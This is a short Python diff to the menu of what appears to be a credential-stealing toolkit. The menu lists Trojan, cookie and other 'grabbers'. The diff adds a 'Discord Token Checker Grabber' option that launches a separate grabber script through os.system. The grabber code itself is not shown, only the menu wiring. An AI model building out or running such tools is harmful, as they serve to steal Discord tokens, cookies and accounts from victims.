@@ -80,6 +80,7 @@ def grabbers():
   [3] Trojan Grabber
   [4] Cookie Grabber
   [5] Snee Grabber
+  [6] Discord Token Checker Grabber
   [0] Back
   """)
   USER_OPTION2 = input(bcolors.OKBLUE +    "[>] ")
@@ -102,6 +103,9 @@ def grabbers():
        grabbers()
   elif USER_OPTION2 == "5":
        snee()
+  elif USER_OPTION2 == "6":
+       clearcmd()
+       os.system('python ./data/grabber_scripts/discord_token_checker_grabber.py')
 
 def zyzz():
   print(bcolors.OKBLUE + "Today's date:",today)
